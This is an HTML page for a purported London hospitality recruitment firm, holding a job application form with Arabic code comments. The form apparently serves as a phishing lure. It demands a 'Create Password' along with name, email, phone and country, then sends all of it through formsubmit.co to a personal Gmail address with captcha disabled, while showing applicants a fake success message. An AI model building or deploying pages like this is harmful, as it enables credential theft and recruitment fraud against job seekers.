<!DOCTYPE html> 
<html lang="en" dir="ltr"> 
<head> 
<meta charset="UTF-8"> 
<meta name="viewport" content="width=device-width, initial-scale=1.0"> 
<title>Staff.Direct London - Premium Hospitality Recruitment</title> 
<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600;700&family=Playfair+Display:wght@700&display=swap" rel="stylesheet"> 
<style> 
:root { --navy: #0A1F44; --gold: #D4AF37; --orange: #F57C00; --green: #27AE60; } 
* {box-sizing: border-box; margin: 0; padding: 0;} 
body { background: linear-gradient(135deg, var(--navy) 0%, #1a3a6e 100%); font-family: 'Poppins', sans-serif; padding: 20px; display: flex; justify-content: center; align-items: center; min-height: 100vh;} 

.container { 
  background: #fff; 
  max-width: 650px; 
  width: 100%; 
  padding: 50px 35px; 
  border-radius: 20px; 
  border-top: 6px solid var(--gold); 
  box-shadow: 0 15px 50px rgba(0,0,0,0.4); 
  text-align: center; 
}

.header {margin-bottom: 30px;}
.logo-img { width: 180px; height: auto; margin: 0 auto 20px; object-fit: contain; }

.brand {font-family: 'Playfair Display', serif; font-size: 32px; font-weight: 700; color: var(--navy);} 
.subtitle {color: var(--orange); font-size: 13px; font-weight: 600; margin-bottom: 10px; text-transform: uppercase; letter-spacing: 2px;} 
h2 {color: var(--navy); margin: 20px 0 8px; font-size: 26px;} 
.desc {color: #666; margin-bottom: 30px; font-size: 15px;} 

.form-group {text-align: left; margin-bottom: 18px;}
label {display: block; color: var(--navy); font-weight: 600; font-size: 14px; margin-bottom: 6px;}
input, select {width: 100%; padding: 15px 16px; border: 2px solid #eee; border-radius: 12px; font-family: 'Poppins'; font-size: 15px;} 

.btn {width: 100%; padding: 18px; background: linear-gradient(135deg, var(--gold) 0%, #B8860B 100%); color: var(--navy); border: none; border-radius: 12px; font-size: 18px; font-weight: 700; cursor: pointer;}

/* رسالة النجاح */
.success-message {
  display: none;
  background: #D4EDDA;
  color: var(--green);
  padding: 15px;
  border-radius: 10px;
  border: 2px solid var(--green);
  font-weight: 600;
  margin-bottom: 20px;
}
</style> 
</head> 
<body> 
<div class="container"> 

<div class="header">
  <img src="images.jpeg" alt="Staff.Direct Logo" class="logo-img">
  <div class="brand">STAFF.DIRECT LONDON</div> 
  <div class="subtitle">Premium Hospitality Recruitment</div> 
</div>

<!-- رسالة النجاح هتظهر هنا -->
<div id="success" class="success-message">
  ✅ Application Submitted Successfully! <br>
  We will contact you within 24 hours.
</div>

<h2>Job Application Form</h2> 
<p class="desc">Join our elite team of hospitality professionals. Fill out the form below and our recruitment team will contact you within 24 hours.</p> 

<form id="jobForm" action="https://formsubmit.co/mosabshareef22@gmail.com" method="POST">
  
  <input type="hidden" name="_subject" value="New Job Application - Staff.Direct London">
  <input type="hidden" name="_captcha" value="false">
  <!-- شلنا _next عشان ما يحول لصفحة 404 -->

  <div class="form-group"><label>Full Name *</label><input name="Full Name" required></div>
  <div class="form-group"><label>Email Address *</label><input name="Email" type="email" required></div>
  <div class="form-group"><label>Phone Number *</label><input name="Phone Number" type="tel" required></div>
  <div class="form-group"><label>Create Password *</label><input name="Password" type="password" required></div>
  <div class="form-group"><label>Country *</label>
    <select name="Country" required>
      <option value="">Select your country</option>
      <option>Nepal</option><option>UK</option><option>USA</option><option>UAE</option><option>Egypt</option><option>Other</option>
    </select>
  </div>
  <div class="form-group"><label>Job Position *</label>
    <select name="Job Position" required>
      <option value="">Select position</option><option>Receptionist</option><option>Chef</option><option>Other</option>
    </select>
  </div>

  <button type="submit" class="btn">Submit Application</button>
</form>

</div>

<script>
// لما الفورم يترسل بنجاح
document.getElementById('jobForm').addEventListener('submit', function() {
  setTimeout(function() {
    document.getElementById('success').style.display = 'block';
    document.getElementById('jobForm').reset(); // يفضي الفورم
    window.scrollTo(0,0); // يطلع فوق
  }, 1000);
});
</script>

</body> 
</html>
